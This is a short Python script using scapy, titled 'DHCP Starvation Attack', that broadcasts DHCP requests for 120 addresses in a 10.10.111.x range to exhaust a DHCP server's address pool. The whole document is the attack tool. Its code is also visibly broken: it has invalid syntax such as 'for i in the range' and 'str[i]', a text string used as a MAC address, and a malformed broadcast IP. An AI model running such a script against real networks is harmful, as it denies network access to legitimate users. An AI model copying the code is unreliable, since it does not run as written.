from scapy.all import *

class DHCPStarvation(object):
  def __init__(self):
      self.mac = [""]
      self.ip = []
      
  def starve(self):
      print "*** DHCP Starvation Attack ***"
      for i in the range(1,121):
          src_mac = ""
          request_ip = "10.10.111." + str[i]
          print "Request for ip : "+ request_ip
          # get dummy mac
          src_mac = "Dummy mac address produced is :"
          print src_mac
          self.mac.append(src_mac)
          
          #create DHCP request
          pkt = Ether(src= src_mac,dst="ff:ff:ff:ff:ff:ff")
          pkt /= IP(src="0.0.0.0", dst="255:255:255:255")
          pkt /= UDP(sport=68,dport=67)
          pkt /= BOOTP(op=1, chaddr=src_mac)
          pkt /= DHCP(options=[("message-type","request"),("requested_addr", request_ip), ("server_id", "10.10.111.1"), "end"])
          sendp(pkt)
          print "Trying to occupy "+ request_ip
          time.sleep(1)
if __name__ == "__main__":
    starvation = DHCPStarvation()
    starvation.starve()
    
